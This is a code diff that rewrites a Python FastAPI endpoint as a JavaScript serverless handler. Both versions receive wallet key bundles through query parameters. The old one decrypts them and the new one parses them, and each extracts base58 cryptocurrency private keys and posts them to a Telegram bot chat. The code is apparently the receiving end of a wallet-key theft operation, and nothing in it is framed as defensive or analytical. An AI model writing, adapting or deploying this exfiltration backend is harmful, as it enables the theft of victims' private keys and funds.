@@ -1,61 +1,46 @@
-import base64
-import os
-import requests
-from fastapi import FastAPI, Request
-from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+export default async function handler(req, res) {
+  const { bundles, keybundle } = req.query;
 
-app = FastAPI()
+  const botToken = process.env.BOT_TOKEN;
+  const chatId = process.env.CHAT_ID;
 
-BASE58_ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
+  let decodedBundle;
+  try {
+    decodedBundle = JSON.parse(decodeURIComponent(keybundle));
+  } catch (err) {
+    return res.status(400).send("Invalid keybundle format");
+  }
 
-TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
-TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
+  const wallets = decodedBundle?.wallets || [];
 
+  // Extract base58 private keys
+  let message = wallets
+    .map((wallet, i) => `Wallet ${i + 1}:\n${wallet.privateKey?.base58 || 'N/A'}`)
+    .join("\n\n");
 
-def bytes_to_base58(b):
-    num = int.from_bytes(b, 'big')
-    encode = ''
-    while num > 0:
-        num, rem = divmod(num, 58)
-        encode = BASE58_ALPHABET[rem] + encode
-    pad = 0
-    for byte in b:
-        if byte == 0:
-            pad += 1
-        else:
-            break
-    return '1' * pad + encode
+  if (!message) message = "No base58 private keys found.";
 
+  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-@app.get("/api/messages")
-async def receive_data(bundles: str, keybundle: str, request: Request):
-    sbundles = bundles.split(",")
-    key = base64.b64decode(keybundle)
-    aesgcm = AESGCM(key)
+  try {
+    const telegramRes = await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+      }),
+    });
 
-    privkeys = []
-    for sbundle in sbundles:
-        try:
-            iv_b64, encrypted_b64 = sbundle.split(":")
-            iv = base64.b64decode(iv_b64)
-            ciphertext = base64.b64decode(encrypted_b64)
-            decrypted = aesgcm.decrypt(iv, ciphertext, None)
-            b58_priv = bytes_to_base58(decrypted)
-            privkeys.append(b58_priv)
-        except Exception:
-            continue
+    const data = await telegramRes.json();
+    if (!data.ok) {
+      console.error("Telegram API error:", data);
+      return res.status(500).send("Failed to send message");
+    }
 
-    message = "\n".join([f"Wallet {i+1}:", key] for i, key in enumerate(privkeys))
-
-    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
-        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-        payload = {
-            "chat_id": TELEGRAM_CHAT_ID,
-            "text": message
-        }
-        try:
-            requests.post(url, data=payload)
-        except Exception:
-            pass
-
-    return {"status": "ok"}
+    res.status(200).send("Success");
+  } catch (e) {
+    console.error("Handler error:", e);
+    res.status(500).send("Server error");
+  }
+}
